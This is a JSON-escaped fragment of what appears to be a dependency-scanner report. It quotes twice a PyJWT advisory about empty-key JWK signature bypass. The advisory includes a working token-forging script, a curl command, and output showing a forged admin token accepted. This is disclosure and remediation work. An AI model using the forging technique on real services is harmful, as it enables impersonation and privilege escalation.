```\n\u003e \n\u003e Contrast the sibling `prepare_key`, which DID get the guard (lines 325-329):\n\u003e \n\u003e ```python\n\u003e def prepare_key(self, key: str | bytes) -\u003e bytes:\n\u003e     key_bytes = force_bytes(key)\n\u003e \n\u003e     if len(key_bytes) == 0:\n\u003e         raise InvalidKeyError(\"HMAC key must not be empty.\")\n\u003e ```\n\u003e \n\u003e In `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key\n\u003e material directly, bypassing `prepare_key`, and the length warning is non-fatal\n\u003e by default:\n\u003e \n\u003e ```python\n\u003e         if isinstance(key, PyJWK):\n\u003e             if alg != key.algorithm_name:\n\u003e                 raise InvalidAlgorithmError(\n\u003e                     f\"Token algorithm {alg!r} does not match the key's \"\n\u003e                     f\"algorithm {key.algorithm_name!r}\"\n\u003e                 )\n\u003e             alg_obj = key.Algorithm\n\u003e             prepared_key = key.key            # from_jwk output (b\"\"), prepare_key not run\n\u003e         else:\n\u003e             try:\n\u003e                 alg_obj = self.get_algorithm_by_name(alg)\n\u003e             except NotImplementedError as e:\n\u003e                 raise InvalidAlgorithmError(\"Algorithm not supported\") from e\n\u003e             prepared_key = alg_obj.prepare_key(key)\n\u003e \n\u003e         key_length_msg = alg_obj.check_key_length(prepared_key)\n\u003e         if key_length_msg:\n\u003e             if effective_options.get(\"enforce_minimum_key_length\", False):\n\u003e                 raise InvalidKeyError(key_length_msg)\n\u003e             else:\n\u003e                 warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only\n\u003e \n\u003e         if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b\"\" succeeds\n\u003e             raise InvalidSignatureError(\"Signature verification failed\")\n\u003e ```\n\u003e \n\u003e `PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a\n\u003e `{\"kty\":\"oct\",\"k\":\"\"}` JWK yields `PyJWK.key == b\"\"`. `PyJWKSet` and\n\u003e `PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the\n\u003e JWKS-over-HTTP resolution route is affected identically.\n\u003e \n\u003e The 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM\n\u003e hardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix\n\u003e (GHSA-jq35-7prp-9v3f), and the test suite has\n\u003e `test_hmac_prepare_key_rejects_empty_key` plus\n\u003e `test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty\n\u003e JSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the\n\u003e untested sibling path this report closes.\n\u003e \n\u003e ### How the attacker input reaches the sink\n\u003e \n\u003e An unauthenticated HTTP client controls the bearer token entirely: its `kid`\n\u003e selects the empty-`k` oct JWK, and its signature is computed locally with the\n\u003e empty key. The token flows request header -\u003e `PyJWKClient.get_signing_key_from_jwt`\n\u003e (kid resolution against the trusted JWKS) -\u003e `jwt.decode` with the resolved\n\u003e `PyJWK` -\u003e `_verify_signature` -\u003e `HMACAlgorithm.verify(signing_input, b\"\", sig)`.\n\u003e No secret,\n\u003e credential, or prior session is required; the only server-side precondition is a\n\u003e JWKS oct entry with an empty `k`, which the \"unset signing secret\" configuration\n\u003e produces. This is the identical trust boundary the string-secret path already\n\u003e guards.\n\u003e \n\u003e ### Proof of concept\n\u003e \n\u003e ### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)\n\u003e \n\u003e Two services model a standard OIDC-style deployment: an auth service publishing a\n\u003e JWKS, and a protected resource server validating bearer tokens against that JWKS\n\u003e with PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret\n\u003e is sourced from an unset env var (`SIGNING_SECRET` unset -\u003e `\"\"`), so the\n\u003e published oct JWK carries `k == \"\"`.\n\u003e \n\u003e `idp.py` (auth service):\n\u003e \n\u003e ```python\n\u003e import os, base64\n\u003e from flask import Flask, jsonify\n\u003e app = Flask(__name__)\n\u003e SIGNING_SECRET = os.environ.get(\"SIGNING_SECRET\", \"\")   # UNSET at runtime -\u003e \"\"\n\u003e def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\u003e \n\u003e @app.route(\"/.well-known/jwks.json\")\n\u003e def jwks():\n\u003e     return jsonify({\"keys\": [{\n\u003e         \"kty\": \"oct\", \"use\": \"sig\", \"alg\": \"HS256\",\n\u003e         \"kid\": \"auth-signing-2026\",\n\u003e         \"k\": b64u(SIGNING_SECRET.encode()),   # empty secret -\u003e k == \"\"\n\u003e     }]})\n\u003e \n\u003e if __name__ == \"__main__\":\n\u003e     app.run(port=9101)\n\u003e ```\n\u003e \n\u003e `api.py` (protected resource server):\n\u003e \n\u003e ```python\n\u003e from flask import Flask, request, jsonify\n\u003e import jwt\n\u003e from jwt import PyJWKClient\n\u003e app = Flask(__name__)\n\u003e jwks_client = PyJWKClient(\"http://127.0.0.1:9101/.well-known/jwks.json\")\n\u003e \n\u003e def authenticate():\n\u003e     auth = request.headers.get(\"Authorization\", \"\")\n\u003e     if not auth.startswith(\"Bearer \"):\n\u003e         return None, \"missing bearer token\"\n\u003e     token = auth.split(\" \", 1)[1]\n\u003e     try:\n\u003e         signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid\n\u003e         claims = jwt.decode(token, signing_key, algorithms=[\"HS256\", \"RS256\"])\n\u003e     except Exception as e:\n\u003e         return None, \"invalid token: %s\" % type(e).__name__\n\u003e     return claims, None\n\u003e \n\u003e @app.route(\"/api/admin/users\")\n\u003e def admin_users():\n\u003e     claims, err = authenticate()\n\u003e     if err:\n\u003e         return jsonify({\"error\": err}), 401\n\u003e     if claims.get(\"role\") != \"admin\":\n\u003e         return jsonify({\"error\": \"forbidden\"}), 403\n\u003e     return jsonify({\"ok\": True, \"action\": \"list_all_users\",\n\u003e                     \"as_user\": claims.get(\"sub\"), \"role\": claims.get(\"role\")})\n\u003e \n\u003e if __name__ == \"__main__\":\n\u003e     app.run(port=9102)\n\u003e ```\n\u003e \n\u003e `forge.py` (attacker; no secret knowledge):\n\u003e \n\u003e ```python\n\u003e import hmac, hashlib, base64, json, sys\n\u003e def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\u003e header={\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"auth-signing-2026\"}\n\u003e payload={\"sub\":\"attacker@evil.example\",\"role\":\"admin\"}\n\u003e si=b64u(json.dumps(header,separators=(',',':')).encode())+\".\"+b64u(json.dumps(payload,separators=(',',':')).encode())\n\u003e key = sys.argv[1].encode() if len(sys.argv)\u003e1 else b\"\"   # empty key\n\u003e sig=hmac.new(key, si.encode(), hashlib.sha256).digest()\n\u003e print(si+\".\"+b64u(sig))\n\u003e ```\n\u003e \n\u003e Run:\n\u003e \n\u003e ```bash\n\u003e python -m venv v \u0026\u0026 ./v/bin/pip install \"PyJWT==2.13.0\" flask\n\u003e ( SIGNING_SECRET= ./v/bin/python idp.py \u0026 ) ; ./v/bin/python api.py \u0026\n\u003e FORGED=$(./v/bin/python forge.py \"\")\n\u003e curl -s -H \"Authorization: Bearer $FORGED\" http://127.0.0.1:9102/api/admin/users\n\u003e ```\n\u003e \n\u003e Verbatim run (attack, both negative controls, sanity, and patched-build re-run):\n\u003e \n\u003e ```\n\u003e ### PyJWT version\n\u003e 2.13.0\n\u003e \n\u003e ### JWKS published by the auth service (note the empty \"k\"):\n\u003e {\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\u003e \n\u003e ### Baseline: unauthenticated request to admin endpoint\n\u003e HTTP 401\n\u003e \n\u003e ### ATTACK: attacker forges HS256 admin token signed with the EMPTY key\n\u003e forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ\n\u003e response:\n\u003e {\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n\u003e   \u003c-- HTTP 200\n\u003e \n\u003e ### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -\u003e reject\n\u003e {\"error\":\"invalid token: InvalidSignatureError\"}\n\u003e   \u003c-- HTTP 401\n\u003e \n\u003e ### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail\n\u003e JWKS now has non-empty k:\n\u003e {\"keys\":[{\"alg\":\"HS256\",\"k\":\"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\u003e {\"error\":\"invalid token: InvalidSignatureError\"}\n\u003e   \u003c-- HTTP 401\n\u003e \n\u003e ### Sanity: a legitimately-signed token with the real secret is accepted\n\u003e {\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n\u003e   \u003c-- HTTP 200\n\u003e \n\u003e ### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -\u003e now rejected\n\u003e JWKS (empty k, vulnerable config):\n\u003e {\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\u003e {\"error\":\"invalid token: PyJWKSetError\"}\n\u003e   \u003c-- HTTP 401\n\u003e ```\n\u003e \n\u003e The attack returns HTTP 200 with `role:admin` from an unauthenticated forged\n\u003e token. Both negative controls (wrong non-empty key; real non-empty secret at the\n\u003e auth service) return 401, isolating the defect to empty-key acceptance. The\n\u003e patched build (the `from_jwk` fix below) rejects the forgery.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e - Unauthenticated authentication bypass / token forgery: an attacker mints tokens\n\u003e   with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,\n\u003e   yielding full impersonation and privilege escalation on any endpoint gated by\n\u003e   such tokens.\n\u003e - Reachable through the documented JWKS verification API\n\u003e   (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.\n\u003e - Triggered by the common \"unset signing secret\" misconfiguration that the\n\u003e   string-secret path already rejects in 2.13.0, leaving the JWK path as an\n\u003e   asymmetric gap.\n\u003e \n\u003e ### Suggested fix\n\u003e \n\u003e Reject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that\n\u003e `prepare_key` already applies:\n\u003e \n\u003e ```python\n\u003e if obj.get(\"kty\") != \"oct\":\n\u003e     raise InvalidKeyError(\"Not an HMAC key\")\n\u003e \n\u003e key_bytes = base64url_decode(obj[\"k\"])\n\u003e if len(key_bytes) == 0:\n\u003e     raise InvalidKeyError(\"HMAC key must not be empty.\")\n\u003e return key_bytes\n\u003e ```\n\u003e \n\u003e This reuses the exact error message and length check the string/bytes path uses,\n\u003e so both HMAC key-loading routes enforce the same invariant. A regression test for\n\u003e the empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.\n\u003e \n\u003e ### Fix PR\n\u003e \n\u003e https://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory\n\u003e temp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,\n\u003e DCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,\n\u003e `test_api_jwk.py`, `test_api_jws.py` pass).\n\u003e \n\u003e ### Credit\n\u003e \n\u003e Reported by tonghuaroot.\n\u003e \n\u003e \u003e Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.\n\u003e \n\u003e ## Maintainer update — 2026-09-11\n\u003e \n\u003e The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | pyjwt | 2.10.1 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-pxh4-856f-4h89 | pyjwt | 2.14.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"GHSA-pxh4-856f-4h89\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [GHSA-pxh4-856f-4h89](https://osv.dev/GHSA-pxh4-856f-4h89)**.\n\n## [GHSA-pxh4-856f-4h89](https://osv.dev/GHSA-pxh4-856f-4h89)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is\n\u003e the empty string and returns a zero-length key without raising. When a token is\n\u003e then verified with that key object (a `PyJWK`, or a `PyJWK` resolved by\n\u003e `PyJWKSet` / `PyJWKClient`), the HMAC verifier computes\n\u003e `HMAC(key=b\"\", signing_input)` and accepts any token an attacker forged with the\n\u003e same empty key. The attacker needs no secret knowledge: they reproduce the digest\n\u003e locally with an empty key and set the token's `kid` to the empty-`k` JWK.\n\u003e \n\u003e The empty-key rejection that `HMACAlgorithm.prepare_key` performs for\n\u003e string/bytes secrets (added in 2.13.0) was never propagated to the sibling\n\u003e `from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under\n\u003e default decode options this path only emits an `InsecureKeyLengthWarning`, not an\n\u003e error, so verification still succeeds. This is the same \"empty/nil HMAC key is\n\u003e accepted by verify\" defect the JWT ecosystem is currently closing library-side:\n\u003e fast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a\n\u003e library-side reject-empty-HMAC-key precondition.\n\u003e \n\u003e ### Affected versions\n\u003e \n\u003e `PyJWT` (PyPI package `pyjwt`) `\u003c= 2.13.0`, current `master` at commit\n\u003e `7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is\n\u003e already guarded in 2.13.0; the JWK/JWKS path is not.\n\u003e \n\u003e ### Privilege required\n\u003e \n\u003e Unauthenticated. Any party who can reach a JWT-verifying endpoint of an\n\u003e application that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct\n\u003e key has an empty `k` can forge tokens with arbitrary claims.\n\u003e \n\u003e Preconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct\n\u003e entry carries an empty `k`. This occurs when the signing secret is sourced from\n\u003e an unset environment variable / unset config row / key-finder fallback that\n\u003e base64url-encodes `b\"\"` into the published JWKS, or when the application trusts a\n\u003e JWKS containing such an entry. The equivalent unset-secret case for the\n\u003e string-secret API (`jwt.decode(token, key=\"\")`) is already rejected in 2.13.0;\n\u003e the JWK route is the remaining reachable surface for the same misconfiguration.\n\u003e \n\u003e ### Vulnerable code\n\u003e \n\u003e `jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):\n\u003e \n\u003e ```python\n\u003e @staticmethod\n\u003e def from_jwk(jwk: str | JWKDict) -\u003e bytes:\n\u003e     try:\n\u003e         if isinstance(jwk, str):\n\u003e             obj: JWKDict = json.loads(jwk)\n\u003e         elif isinstance(jwk, dict):\n\u003e             obj = jwk\n\u003e         else:\n\u003e             raise ValueError\n\u003e     except ValueError:\n\u003e         raise InvalidKeyError(\"Key is not valid JSON\") from None\n\u003e \n\u003e     if obj.get(\"kty\") != \"oct\":\n\u003e         raise InvalidKeyError(\"Not an HMAC key\")\n\u003e \n\u003e     return base64url_decode(obj[\"k\"])   # \u003c-- empty k -\u003e b\"\", no rejection\n\u003e ```\n\u003e \n\u003e Contrast the sibling `prepare_key`, which DID get the guard (lines 325-329):\n\u003e \n\u003e ```python\n\u003e def prepare_key(self, key: str | bytes) -\u003e bytes:\n\u003e     key_bytes = force_bytes(key)\n\u003e \n\u003e     if len(key_bytes) == 0:\n\u003e         raise InvalidKeyError(\"HMAC key must not be empty.\")\n\u003e ```\n\u003e \n\u003e In `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key\n\u003e material directly, bypassing `prepare_key`, and the length warning is non-fatal\n\u003e by default:\n\u003e \n\u003e ```python\n\u003e         if isinstance(key, PyJWK):\n\u003e             if alg != key.algorithm_name:\n\u003e                 raise InvalidAlgorithmError(\n\u003e                     f\"Token algorithm {alg!r} does not match the key's \"\n\u003e                     f\"algorithm {key.algorithm_name!r}\"\n\u003e                 )\n\u003e             alg_obj = key.Algorithm\n\u003e             prepared_key = key.key            # from_jwk output (b\"\"), prepare_key not run\n\u003e         else:\n\u003e             try:\n\u003e                 alg_obj = self.get_algorithm_by_name(alg)\n\u003e             except NotImplementedError as e:\n\u003e                 raise InvalidAlgorithmError(\"Algorithm not supported\") from e\n\u003e             prepared_key = alg_obj.prepare_key(key)\n\u003e \n\u003e         key_length_msg = alg_obj.check_key_length(prepared_key)\n\u003e         if key_length_msg:\n\u003e             if effective_options.get(\"enforce_minimum_key_length\", False):\n\u003e                 raise InvalidKeyError(key_length_msg)\n\u003e             else:\n\u003e                 warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only\n\u003e \n\u003e         if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b\"\" succeeds\n\u003e             raise InvalidSignatureError(\"Signature verification failed\")\n\u003e ```\n\u003e \n\u003e `PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a\n\u003e `{\"kty\":\"oct\",\"k\":\"\"}` JWK yields `PyJWK.key == b\"\"`. `PyJWKSet` and\n\u003e `PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the\n\u003e JWKS-over-HTTP resolution route is affected identically.\n\u003e \n\u003e The 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM\n\u003e hardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix\n\u003e (GHSA-jq35-7prp-9v3f), and the test suite has\n\u003e `test_hmac_prepare_key_rejects_empty_key` plus\n\u003e `test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty\n\u003e JSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the\n\u003e untested sibling path this report closes.\n\u003e \n\u003e ### How the attacker input reaches the sink\n\u003e \n\u003e An unauthenticated HTTP client controls the bearer token entirely: its `kid`\n\u003e selects the empty-`k` oct JWK, and its signature is computed locally with the\n\u003e empty key. The token flows request header -\u003e `PyJWKClient.get_signing_key_from_jwt`\n\u003e (kid resolution against the trusted JWKS) -\u003e `jwt.decode` with the resolved\n\u003e `PyJWK` -\u003e `_verify_signature` -\u003e `HMACAlgorithm.verify(signing_input, b\"\", sig)`.\n\u003e No secret,\n\u003e credential, or prior session is required; the only server-side precondition is a\n\u003e JWKS oct entry with an empty `k`, which the \"unset signing secret\" configuration\n\u003e produces. This is the identical trust boundary the string-secret path already\n\u003e guards.\n\u003e \n\u003e ### Proof of concept\n\u003e \n\u003e ### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)\n\u003e \n\u003e Two services model a standard OIDC-style deployment: an auth service publishing a\n\u003e JWKS, and a protected resource server validating bearer tokens against that JWKS\n\u003e with PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret\n\u003e is sourced from an unset env var (`SIGNING_SECRET` unset -\u003e `\"\"`), so the\n\u003e published oct JWK carries `k == \"\"`.\n\u003e \n\u003e `idp.py` (auth service):\n\u003e \n\u003e ```python\n\u003e import os, base64\n\u003e from flask import Flask, jsonify\n\u003e app = Flask(__name__)\n\u003e SIGNING_SECRET = os.environ.get(\"SIGNING_SECRET\", \"\")   # UNSET at runtime -\u003e \"\"\n\u003e def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\u003e \n\u003e @app.route(\"/.well-known/jwks.json\")\n\u003e def jwks():\n\u003e     return jsonify({\"keys\": [{\n\u003e         \"kty\": \"oct\", \"use\": \"sig\", \"alg\": \"HS256\",\n\u003e         \"kid\": \"auth-signing-2026\",\n\u003e         \"k\": b64u(SIGNING_SECRET.encode()),   # empty secret -\u003e k == \"\"\n\u003e     }]})\n\u003e \n\u003e if __name__ == \"__main__\":\n\u003e     app.run(port=9101)\n\u003e ```\n\u003e \n\u003e `api.py` (protected resource server):\n\u003e \n\u003e ```python\n\u003e from flask import Flask, request, jsonify\n\u003e import jwt\n\u003e from jwt import PyJWKClient\n\u003e app = Flask(__name__)\n\u003e jwks_client = PyJWKClient(\"http://127.0.0.1:9101/.well-known/jwks.json\")\n\u003e \n\u003e def authenticate():\n\u003e     auth = request.headers.get(\"Authorization\", \"\")\n\u003e     if not auth.startswith(\"Bearer \"):\n\u003e         return None, \"missing bearer token\"\n\u003e     token = auth.split(\" \", 1)[1]\n\u003e     try:\n\u003e         signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid\n\u003e         claims = jwt.decode(token, signing_key, algorithms=[\"HS256\", \"RS256\"])\n\u003e     except Exception as e:\n\u003e         return None, \"invalid token: %s\" % type(e).__name__\n\u003e     return claims, None\n\u003e \n\u003e @app.route(\"/api/admin/users\")\n\u003e def admin_users():\n\u003e     claims, err = authenticate()\n\u003e     if err:\n\u003e         return jsonify({\"error\": err}), 401\n\u003e     if claims.get(\"role\") != \"admin\":\n\u003e         return jsonify({\"error\": \"forbidden\"}), 403\n\u003e     return jsonify({\"ok\": True, \"action\": \"list_all_users\",\n\u003e                     \"as_user\": claims.get(\"sub\"), \"role\": claims.get(\"role\")})\n\u003e \n\u003e if __name__ == \"__main__\":\n\u003e     app.run(port=9102)\n\u003e ```\n\u003e \n\u003e `forge.py` (attacker; no secret knowledge):\n\u003e \n\u003e ```python\n\u003e import hmac, hashlib, base64, json, sys\n\u003e def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\u003e header={\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"auth-signing-2026\"}\n\u003e payload={\"sub\":\"attacker@evil.example\",\"role\":\"admin\"}\n\u003e si=b64u(json.dumps(header,separators=(',',':')).encode())+\".\"+b64u(json.dumps(payload,separators=(',',':')).encode())\n\u003e key = sys.argv[1].encode() if len(sys.argv)\u003e1 else b\"\"   # empty key\n\u003e sig=hmac.new(key, si.encode(), hashlib.sha256).digest()\n\u003e print(si+\".\"+b64u(sig))\n\u003e ```\n\u003e \n\u003e Run:\n\u003e \n\u003e ```bash\n\u003e python -m venv v \u0026\u0026 ./v/bin/pip install \"PyJWT==2.13.0\" flask\n\u003e ( SIGNING_SECRET= ./v/bin/python idp.py \u0026 ) ; ./v/bin/python api.py \u0026\n\u003e FORGED=$(./v/bin/python forge.py \"\")\n\u003e curl -s -H \"Authorization: Bearer $FORGED\" http://127.0.0.1:9102/api/admin/users\n\u003e ```\n\u003e \n\u003e Verbatim run (attack, both negative controls, sanity, and patched-build re-run):\n\u003e \n\u003e ```\n\u003e ### PyJWT version\n\u003e 2.13.0\n\u003e \n\u003e ### JWKS published by the auth service (note the empty \"k\"):\n\u003e {\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\u003e \n\u003e ### Baseline: unauthenticated request to admin endpoint\n\u003e HTTP 401\n\u003e \n\u003e ### ATTACK: attacker forges HS256 admin token signed with the EMPTY key\n\u003e forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ\n\u003e response:\n\u003e {\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n\u003e   \u003c-- HTTP 200\n\u003e \n\u003e ### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -\u003e reject\n\u003e {\"error\":\"invalid token: InvalidSignatureError\"}\n\u003e   \u003c-- HTTP 401\n\u003e \n\u003e ### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail\n\u003e JWKS now has non-empty k:\n\u003e {\"keys\":[{\"alg\":\"HS256\",\"k\":\"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\u003e {\"error\":\"invalid token: InvalidSignatureError\"}\n\u003e   \u003c-- HTTP 401\n\u003e \n\u003e ### Sanity: a legitimately-signed token with the real secret is accepted\n\u003e {\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n\u003e   \u003c-- HTTP 200\n\u003e \n\u003e ### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -\u003e now rejected\n\u003e JWKS (empty k, vulnerable config):\n\u003e {\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\u003e {\"error\":\"invalid token: PyJWKSetError\"}\n\u003e   \u003c-- HTTP 401\n\u003e ```\n\u003e \n\u003e The attack returns HTTP 200 with `role:admin` from an unauthenticated forged\n\u003e token. Both negative controls (wrong non-empty key; real non-empty secret at the\n\u003e auth service) return 401, isolating the defect to empty-key acceptance. The\n\u003e patched build (the `from_jwk` fix below) rejects the forgery.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e - Unauthenticated authentication bypass / token forgery: an attacker mints tokens\n\u003e   with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,\n\u003e   yielding full impersonation and privilege escalation on any endpoint gated by\n\u003e   such tokens.\n\u003e - Reachable through the documented JWKS verification API\n\u003e   (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.\n\u003e - Triggered by the common \"unset signing secret\" misconfiguration that the\n\u003e   string-secret path already rejects in 2.13.0, leaving the JWK path as an\n\u003e   asymmetric gap.\n\u003e \n\u003e ### Suggested fix\n\u003e \n\u003e Reject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that\n\u003e `prepare_key` already applies:\n\u003e \n\u003e ```python\n\u003e if obj.get(\"kty\") != \"oct\":\n\u003e     raise InvalidKeyError(\"Not an HMAC key\")\n\u003e \n\u003e key_bytes = base64url_decode(obj[\"k\"])\n\u003e if len(key_bytes) == 0:\n\u003e     raise InvalidKeyError(\"HMAC key must not be empty.\")\n\u003e return key_bytes\n\u003e ```\n\u003e \n\u003e This reuses the exact error message and length check the string/bytes path uses,\n\u003e so both HMAC key-loading routes enforce the same invariant. A regression test for\n\u003e the empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.\n\u003e \n\u003e ### Fix PR\n\u003e \n\u003e https://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory\n\u003e temp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,\n\u003e DCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,\n\u003e `test_api_jwk.py`, `test_api_jws.py` pass).\n\u003e \n\u003e ### Credit\n\u003e \n\u003e Reported by tonghuaroot.\n\u003e \n\u003e \u003e Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.\n\u003e \n\u003e ## Maintainer update — 2026-09-11\n\u003e \n\u003e The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| 